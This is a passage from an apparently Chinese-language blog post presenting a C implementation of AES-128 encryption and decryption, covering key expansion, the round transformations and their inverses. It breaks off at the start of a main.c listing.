class="line"><span class="keyword">return</span> one | two | three | four;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 常量轮值表</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">int</span> Rcon[<span class="number">10</span>] = &#123; <span class="number">0x01000000</span>, <span class="number">0x02000000</span>,</span><br><span class="line"><span class="number">0x04000000</span>, <span class="number">0x08000000</span>,</span><br><span class="line"><span class="number">0x10000000</span>, <span class="number">0x20000000</span>,</span><br><span class="line"><span class="number">0x40000000</span>, <span class="number">0x80000000</span>,</span><br><span class="line"><span class="number">0x1b000000</span>, <span class="number">0x36000000</span> &#125;;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 密钥扩展中的T函数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">T</span><span class="params">(<span class="type">int</span> num, <span class="type">int</span> round)</span> &#123;</span><br><span class="line"><span class="type">int</span> numArray[<span class="number">4</span>];</span><br><span class="line">splitIntToArray(num, numArray);</span><br><span class="line">leftLoop4int(numArray, <span class="number">1</span>);<span class="comment">//字循环</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//字节代换</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">numArray[i] = getNumFromSBox(numArray[i]);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> result = mergeArrayToInt(numArray);</span><br><span class="line"><span class="keyword">return</span> result ^ Rcon[round];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密钥对应的扩展数组</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> w[<span class="number">44</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 扩展密钥，结果是把w[44]中的每个元素初始化</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">extendKey</span><span class="params">(<span class="type">char</span> *key)</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">w[i] = getWordFromStr(key + i * <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">4</span>, j = <span class="number">0</span>; i &lt; <span class="number">44</span>; i++) &#123;</span><br><span class="line"><span class="keyword">if</span>( i % <span class="number">4</span> == <span class="number">0</span>) &#123;</span><br><span class="line">w[i] = w[i - <span class="number">4</span>] ^ T(w[i - <span class="number">1</span>], j);</span><br><span class="line">j++;<span class="comment">//下一轮</span></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">w[i] = w[i - <span class="number">4</span>] ^ w[i - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 轮密钥加</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">addRoundKey</span><span class="params">(<span class="type">int</span> <span class="built_in">array</span>[<span class="number">4</span>][<span class="number">4</span>], <span class="type">int</span> round)</span> &#123;</span><br><span class="line"><span class="type">int</span> warray[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line">splitIntToArray(w[ round * <span class="number">4</span> + i], warray);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line"><span class="built_in">array</span>[j][i] = <span class="built_in">array</span>[j][i] ^ warray[j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 字节代换</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">subBytes</span><span class="params">(<span class="type">int</span> <span class="built_in">array</span>[<span class="number">4</span>][<span class="number">4</span>])</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line"><span class="built_in">array</span>[i][j] = getNumFromSBox(<span class="built_in">array</span>[i][j]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 行移位</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">shiftRows</span><span class="params">(<span class="type">int</span> <span class="built_in">array</span>[<span class="number">4</span>][<span class="number">4</span>])</span> &#123;</span><br><span class="line"><span class="type">int</span> rowTwo[<span class="number">4</span>], rowThree[<span class="number">4</span>], rowFour[<span class="number">4</span>];</span><br><span class="line"><span class="comment">//复制状态矩阵的第2,3,4行</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">rowTwo[i] = <span class="built_in">array</span>[<span class="number">1</span>][i];</span><br><span class="line">rowThree[i] = <span class="built_in">array</span>[<span class="number">2</span>][i];</span><br><span class="line">rowFour[i] = <span class="built_in">array</span>[<span class="number">3</span>][i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//循环左移相应的位数</span></span><br><span class="line">leftLoop4int(rowTwo, <span class="number">1</span>);</span><br><span class="line">leftLoop4int(rowThree, <span class="number">2</span>);</span><br><span class="line">leftLoop4int(rowFour, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//把左移后的行复制回状态矩阵中</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line"><span class="built_in">array</span>[<span class="number">1</span>][i] = rowTwo[i];</span><br><span class="line"><span class="built_in">array</span>[<span class="number">2</span>][i] = rowThree[i];</span><br><span class="line"><span class="built_in">array</span>[<span class="number">3</span>][i] = rowFour[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 列混合要用到的矩阵</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">int</span> colM[<span class="number">4</span>][<span class="number">4</span>] = &#123; <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line"><span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>,</span><br><span class="line"><span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>,</span><br><span class="line"><span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">GFMul2</span><span class="params">(<span class="type">int</span> s)</span> &#123;</span><br><span class="line"><span class="type">int</span> result = s &lt;&lt; <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> a7 = result &amp; <span class="number">0x00000100</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(a7 != <span class="number">0</span>) &#123;</span><br><span class="line">result = result &amp; <span class="number">0x000000ff</span>;</span><br><span class="line">result = result ^ <span class="number">0x1b</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">GFMul3</span><span class="params">(<span class="type">int</span> s)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> GFMul2(s) ^ s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">GFMul4</span><span class="params">(<span class="type">int</span> s)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> GFMul2(GFMul2(s));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">GFMul8</span><span class="params">(<span class="type">int</span> s)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> GFMul2(GFMul4(s));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">GFMul9</span><span class="params">(<span class="type">int</span> s)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> GFMul8(s) ^ s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">GFMul11</span><span class="params">(<span class="type">int</span> s)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> GFMul9(s) ^ GFMul2(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">GFMul12</span><span class="params">(<span class="type">int</span> s)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> GFMul8(s) ^ GFMul4(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">GFMul13</span><span class="params">(<span class="type">int</span> s)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> GFMul12(s) ^ s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">GFMul14</span><span class="params">(<span class="type">int</span> s)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> GFMul12(s) ^ GFMul2(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * GF上的二元运算</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">GFMul</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> s)</span> &#123;</span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">1</span>)</span><br><span class="line">result = s;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">2</span>)</span><br><span class="line">result = GFMul2(s);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">3</span>)</span><br><span class="line">result = GFMul3(s);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">0x9</span>)</span><br><span class="line">result = GFMul9(s);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">0xb</span>)<span class="comment">//11</span></span><br><span class="line">result = GFMul11(s);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">0xd</span>)<span class="comment">//13</span></span><br><span class="line">result = GFMul13(s);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">0xe</span>)<span class="comment">//14</span></span><br><span class="line">result = GFMul14(s);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 列混合</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">mixColumns</span><span class="params">(<span class="type">int</span> <span class="built_in">array</span>[<span class="number">4</span>][<span class="number">4</span>])</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> tempArray[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">tempArray[i][j] = <span class="built_in">array</span>[i][j];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)&#123;</span><br><span class="line"><span class="built_in">array</span>[i][j] = GFMul(colM[i][<span class="number">0</span>],tempArray[<span class="number">0</span>][j]) ^ GFMul(colM[i][<span class="number">1</span>],tempArray[<span class="number">1</span>][j]) </span><br><span class="line">^ GFMul(colM[i][<span class="number">2</span>],tempArray[<span class="number">2</span>][j]) ^ GFMul(colM[i][<span class="number">3</span>], tempArray[<span class="number">3</span>][j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 把4X4数组转回字符串</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">convertArrayToStr</span><span class="params">(<span class="type">int</span> <span class="built_in">array</span>[<span class="number">4</span>][<span class="number">4</span>], <span class="type">char</span> *str)</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">*str++ = (<span class="type">char</span>)<span class="built_in">array</span>[j][i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 检查密钥长度</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">checkKeyLen</span><span class="params">(<span class="type">int</span> len)</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(len == <span class="number">16</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 参数 p: 明文的字符串数组。</span></span><br><span class="line"><span class="comment"> * 参数 plen: 明文的长度。</span></span><br><span class="line"><span class="comment"> * 参数 key: 密钥的字符串数组。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">aes</span><span class="params">(<span class="type">char</span> *p, <span class="type">int</span> plen, <span class="type">char</span> *key)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> keylen = <span class="built_in">strlen</span>(key);</span><br><span class="line"><span class="keyword">if</span>(plen == <span class="number">0</span> || plen % <span class="number">16</span> != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;明文字符长度必须为16的倍数！\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!checkKeyLen(keylen)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;密钥字符长度错误！长度必须为16、24和32。当前长度为%d\n&quot;</span>,keylen);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extendKey(key);<span class="comment">//扩展密钥</span></span><br><span class="line"><span class="type">int</span> pArray[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; plen; k += <span class="number">16</span>) &#123;</span><br><span class="line">convertToIntArray(p + k, pArray);</span><br><span class="line"></span><br><span class="line">addRoundKey(pArray, <span class="number">0</span>);<span class="comment">//一开始的轮密钥加</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">10</span>; i++)&#123;<span class="comment">//前9轮</span></span><br><span class="line"></span><br><span class="line">subBytes(pArray);<span class="comment">//字节代换</span></span><br><span class="line"></span><br><span class="line">shiftRows(pArray);<span class="comment">//行移位</span></span><br><span class="line"></span><br><span class="line">mixColumns(pArray);<span class="comment">//列混合</span></span><br><span class="line"></span><br><span class="line">addRoundKey(pArray, i);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//第10轮</span></span><br><span class="line">subBytes(pArray);<span class="comment">//字节代换</span></span><br><span class="line"></span><br><span class="line">shiftRows(pArray);<span class="comment">//行移位</span></span><br><span class="line"></span><br><span class="line">addRoundKey(pArray, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">convertArrayToStr(pArray, p + k);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据索引从逆S盒中获取值</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">getNumFromS1Box</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line"><span class="type">int</span> row = getLeft4Bit(index);</span><br><span class="line"><span class="type">int</span> col = getRight4Bit(index);</span><br><span class="line"><span class="keyword">return</span> S2[row][col];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 逆字节变换</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">deSubBytes</span><span class="params">(<span class="type">int</span> <span class="built_in">array</span>[<span class="number">4</span>][<span class="number">4</span>])</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line"><span class="built_in">array</span>[i][j] = getNumFromS1Box(<span class="built_in">array</span>[i][j]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 把4个元素的数组循环右移step位</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">rightLoop4int</span><span class="params">(<span class="type">int</span> <span class="built_in">array</span>[<span class="number">4</span>], <span class="type">int</span> step)</span> &#123;</span><br><span class="line"><span class="type">int</span> temp[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">temp[i] = <span class="built_in">array</span>[i];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> index = step % <span class="number">4</span> == <span class="number">0</span> ? <span class="number">0</span> : step % <span class="number">4</span>;</span><br><span class="line">index = <span class="number">3</span> - index;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line"><span class="built_in">array</span>[i] = temp[index];</span><br><span class="line">index--;</span><br><span class="line">index = index == <span class="number">-1</span> ? <span class="number">3</span> : index;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 逆行移位</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">deShiftRows</span><span class="params">(<span class="type">int</span> <span class="built_in">array</span>[<span class="number">4</span>][<span class="number">4</span>])</span> &#123;</span><br><span class="line"><span class="type">int</span> rowTwo[<span class="number">4</span>], rowThree[<span class="number">4</span>], rowFour[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">rowTwo[i] = <span class="built_in">array</span>[<span class="number">1</span>][i];</span><br><span class="line">rowThree[i] = <span class="built_in">array</span>[<span class="number">2</span>][i];</span><br><span class="line">rowFour[i] = <span class="built_in">array</span>[<span class="number">3</span>][i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rightLoop4int(rowTwo, <span class="number">1</span>);</span><br><span class="line">rightLoop4int(rowThree, <span class="number">2</span>);</span><br><span class="line">rightLoop4int(rowFour, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line"><span class="built_in">array</span>[<span class="number">1</span>][i] = rowTwo[i];</span><br><span class="line"><span class="built_in">array</span>[<span class="number">2</span>][i] = rowThree[i];</span><br><span class="line"><span class="built_in">array</span>[<span class="number">3</span>][i] = rowFour[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 逆列混合用到的矩阵</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">int</span> deColM[<span class="number">4</span>][<span class="number">4</span>] = &#123; <span class="number">0xe</span>, <span class="number">0xb</span>, <span class="number">0xd</span>, <span class="number">0x9</span>,</span><br><span class="line"><span class="number">0x9</span>, <span class="number">0xe</span>, <span class="number">0xb</span>, <span class="number">0xd</span>,</span><br><span class="line"><span class="number">0xd</span>, <span class="number">0x9</span>, <span class="number">0xe</span>, <span class="number">0xb</span>,</span><br><span class="line"><span class="number">0xb</span>, <span class="number">0xd</span>, <span class="number">0x9</span>, <span class="number">0xe</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 逆列混合</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">deMixColumns</span><span class="params">(<span class="type">int</span> <span class="built_in">array</span>[<span class="number">4</span>][<span class="number">4</span>])</span> &#123;</span><br><span class="line"><span class="type">int</span> tempArray[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">tempArray[i][j] = <span class="built_in">array</span>[i][j];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)&#123;</span><br><span class="line"><span class="built_in">array</span>[i][j] = GFMul(deColM[i][<span class="number">0</span>],tempArray[<span class="number">0</span>][j]) ^ GFMul(deColM[i][<span class="number">1</span>],tempArray[<span class="number">1</span>][j]) </span><br><span class="line">^ GFMul(deColM[i][<span class="number">2</span>],tempArray[<span class="number">2</span>][j]) ^ GFMul(deColM[i][<span class="number">3</span>], tempArray[<span class="number">3</span>][j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 把两个4X4数组进行异或</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">addRoundTowArray</span><span class="params">(<span class="type">int</span> aArray[<span class="number">4</span>][<span class="number">4</span>],<span class="type">int</span> bArray[<span class="number">4</span>][<span class="number">4</span>])</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">aArray[i][j] = aArray[i][j] ^ bArray[i][j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 从4个32位的密钥字中获得4X4数组，</span></span><br><span class="line"><span class="comment"> * 用于进行逆列混合</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">getArrayFrom4W</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> <span class="built_in">array</span>[<span class="number">4</span>][<span class="number">4</span>])</span> &#123;</span><br><span class="line"><span class="type">int</span> index = i * <span class="number">4</span>;</span><br><span class="line"><span class="type">int</span> colOne[<span class="number">4</span>], colTwo[<span class="number">4</span>], colThree[<span class="number">4</span>], colFour[<span class="number">4</span>];</span><br><span class="line">splitIntToArray(w[index], colOne);</span><br><span class="line">splitIntToArray(w[index + <span class="number">1</span>], colTwo);</span><br><span class="line">splitIntToArray(w[index + <span class="number">2</span>], colThree);</span><br><span class="line">splitIntToArray(w[index + <span class="number">3</span>], colFour);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line"><span class="built_in">array</span>[i][<span class="number">0</span>] = colOne[i];</span><br><span class="line"><span class="built_in">array</span>[i][<span class="number">1</span>] = colTwo[i];</span><br><span class="line"><span class="built_in">array</span>[i][<span class="number">2</span>] = colThree[i];</span><br><span class="line"><span class="built_in">array</span>[i][<span class="number">3</span>] = colFour[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 参数 c: 密文的字符串数组。</span></span><br><span class="line"><span class="comment"> * 参数 clen: 密文的长度。</span></span><br><span class="line"><span class="comment"> * 参数 key: 密钥的字符串数组。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">deAes</span><span class="params">(<span class="type">char</span> *c, <span class="type">int</span> clen, <span class="type">char</span> *key)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> keylen = <span class="built_in">strlen</span>(key);</span><br><span class="line"><span class="keyword">if</span>(clen == <span class="number">0</span> || clen % <span class="number">16</span> != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;密文字符长度必须为16的倍数！现在的长度为%d\n&quot;</span>,clen);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!checkKeyLen(keylen)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;密钥字符长度错误！长度必须为16、24和32。当前长度为%d\n&quot;</span>,keylen);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extendKey(key);<span class="comment">//扩展密钥</span></span><br><span class="line"><span class="type">int</span> cArray[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; clen; k += <span class="number">16</span>) &#123;</span><br><span class="line">convertToIntArray(c + k, cArray);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addRoundKey(cArray, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> wArray[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">9</span>; i &gt;= <span class="number">1</span>; i--) &#123;</span><br><span class="line">deSubBytes(cArray);</span><br><span class="line"></span><br><span class="line">deShiftRows(cArray);</span><br><span class="line"></span><br><span class="line">deMixColumns(cArray);</span><br><span class="line">getArrayFrom4W(i, wArray);</span><br><span class="line">deMixColumns(wArray);</span><br><span class="line"></span><br><span class="line">addRoundTowArray(cArray, wArray);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">deSubBytes(cArray);</span><br><span class="line"></span><br><span class="line">deShiftRows(cArray);</span><br><span class="line"></span><br><span class="line">addRoundKey(cArray, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">convertArrayToStr(cArray, c + k);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>main.c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 